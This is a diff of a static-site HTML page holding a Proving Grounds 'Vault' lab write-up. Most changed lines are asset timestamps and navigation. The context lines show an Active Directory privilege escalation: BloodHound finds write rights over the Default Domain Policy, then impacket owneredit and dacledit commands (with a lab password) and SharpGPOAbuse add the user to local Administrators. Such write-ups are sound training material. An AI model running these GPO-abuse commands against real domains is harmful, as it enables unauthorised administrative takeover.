@@ -32,27 +32,27 @@
     <meta itemprop="wordCount" content="772">
     <meta itemprop="keywords" content="Responder,DACL,BloodHound,Ntlm_theft,SharpGPOAbuse,Impacket-Owneredit,Impacket-Dacledit">
     <title>Vault :: Dragonfly Commando</title>
-    <link href="/images/favicon.png?1773151138" rel="icon" type="image/png">
-    <link href="/css/auto-complete/auto-complete.min.css?1773151138" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1773151138" defer></script>
-    <script src="/js/search-lunr.js?1773151138" defer></script>
-    <script src="/js/search.js?1773151138" defer></script>
+    <link href="/images/favicon.png?1774925441" rel="icon" type="image/png">
+    <link href="/css/auto-complete/auto-complete.min.css?1774925441" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1774925441" defer></script>
+    <script src="/js/search-lunr.js?1774925441" defer></script>
+    <script src="/js/search.js?1774925441" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1773151138";
+      window.relearn.index_js_url="/searchindex.en.js?1774925441";
     </script>
-    <script src="/js/lunr/lunr.min.js?1773151138" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1773151138" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1773151138" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1773151138" defer></script>
+    <script src="/js/lunr/lunr.min.js?1774925441" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1774925441" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1774925441" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1774925441" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/all.min.css?1773151138" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1773151138" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1773151138" rel="stylesheet">
-    <link href="/css/theme.css?1773151138" rel="stylesheet">
-    <link href="/css/format-html.css?1773151138" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/all.min.css?1774925441" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1774925441" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1774925441" rel="stylesheet">
+    <link href="/css/theme.css?1774925441" rel="stylesheet">
+    <link href="/css/format-html.css?1774925441" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -272,8 +272,8 @@
 <p>Running <code>whoami /priv</code> showed that the user has <strong>SeBackupPrivilege</strong>. However, after some investigation, this turned out to be a rabbit hole.</p>
 <p>I spent some time on it.</p>
 <h2 id="gpo-abuse-via-bloodhound">GPO Abuse via BloodHound<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<p><a href="#R-image-c75839c93c74a78b0ac49c587f4cab24" class="lightbox-link"><img alt="bloodhound" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-bloodhound.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-c75839c93c74a78b0ac49c587f4cab24"><img alt="bloodhound" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-bloodhound.png"></a></p>
+<p><a href="#R-image-a536ead3d3728826ded97275417f8aac" class="lightbox-link"><img alt="bloodhound" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-bloodhound.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-a536ead3d3728826ded97275417f8aac"><img alt="bloodhound" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-bloodhound.png"></a></p>
 <p>Using BloodHound, I discovered that the user anirudh has write permissions over the Default Domain Policy.</p>
 <p>To escalate privileges, I took ownership of the GPO and modified the DACL using Impacket&rsquo;s owneredit and dacledit. Then, I used <strong>SharpGPOAbuse.exe</strong> to add anirudh to the local Administrators group.</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-owneredit -action write -new-owner <span style="color:#e6db74">&#39;anirudh&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC&#39;</span> <span style="color:#e6db74">&#39;vault&#39;</span>/<span style="color:#e6db74">&#39;anirudh&#39;</span>:<span style="color:#e6db74">&#39;SecureHM&#39;</span>
@@ -289,8 +289,8 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DACL backed up to dacledit-20260225-104610.bak
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DACL modified successfully!</span></span></code></pre></div>
-<p><a href="#R-image-2337017b0ce8b3bd2386c75d5d84db00" class="lightbox-link"><img alt="GPO" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/valut-GPO.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-2337017b0ce8b3bd2386c75d5d84db00"><img alt="GPO" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/valut-GPO.png"></a></p>
+<p><a href="#R-image-f83edcfa0d6965bf72cc6383b3aa618d" class="lightbox-link"><img alt="GPO" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/valut-GPO.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-f83edcfa0d6965bf72cc6383b3aa618d"><img alt="GPO" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/valut-GPO.png"></a></p>
 <p>The user anirudh is owner of default domain policy.</p>
 <p>With Powerview, we can confirm the user has permissions on it.</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code class="language-hash" data-lang="hash">*Evil-WinRM* PS C:\Users\anirudh&gt; Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
@@ -317,8 +317,8 @@ Inherited   : False</code></pre></div>
 <p>Now anirudh became administrator!</p>
 <p>After successfully modifying the GPO, I forced a policy update.</p>
 <p><code>gpupdate /force</code></p>
-<p><a href="#R-image-6e5add8c12cdb1986523f9743c2b41dc" class="lightbox-link"><img alt="whoami" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-admin.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-6e5add8c12cdb1986523f9743c2b41dc"><img alt="whoami" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-admin.png"></a></p>
+<p><a href="#R-image-2725116e83b1ed1d853d53e4ce142c07" class="lightbox-link"><img alt="whoami" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-admin.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-2725116e83b1ed1d853d53e4ce142c07"><img alt="whoami" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-admin.png"></a></p>
 <p>With the policy applied, anirudh was added to the local Administrators group. I logged back in, verified my identity with whoami /groups, and successfully retrieved the root flag from the Administrator&rsquo;s desktop.</p>
 
   <footer class="footline">
@@ -370,6 +370,7 @@ Inherited   : False</code></pre></div>
             <li class="" data-nav-id="/private/index.html"><a class="padding default-animation" href="/private/index.html">Private</a><ul id="R-subsections-770b76f7b7b90b1c020ff5111c7b62af" class="collapsible-menu"></ul></li>
             <li class="parent " data-nav-id="/writeup/index.html"><a class="padding default-animation" href="/writeup/index.html">Writeup</a><ul id="R-subsections-4c552b9ca9f2e0503cd4c0d79a1b1839" class="collapsible-menu">
             <li class="parent alwaysopen " data-nav-id="/writeup/proving-grounds/index.html"><a class="padding default-animation" href="/writeup/proving-grounds/index.html">Proving Grounds</a><ul id="R-subsections-5c44e917da5921333a506ba619b792ee" class="collapsible-menu">
+            <li class="" data-nav-id="/writeup/proving-grounds/snookums/index.html"><a class="padding" href="/writeup/proving-grounds/snookums/index.html">Snookums</a></li>
             <li class="" data-nav-id="/writeup/proving-grounds/squid/index.html"><a class="padding" href="/writeup/proving-grounds/squid/index.html">Squid</a></li>
             <li class="" data-nav-id="/writeup/proving-grounds/heist/index.html"><a class="padding" href="/writeup/proving-grounds/heist/index.html">Heist</a></li>
             <li class="active " data-nav-id="/writeup/proving-grounds/vault/index.html"><a class="padding" href="/writeup/proving-grounds/vault/index.html">Vault</a></li>
@@ -394,8 +395,8 @@ Inherited   : False</code></pre></div>
 <div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1773151138" defer></script>
-    <script src="/js/theme.js?1773151138" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1774925441" defer></script>
+    <script src="/js/theme.js?1774925441" defer></script>
     <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
   </body>
 </html>
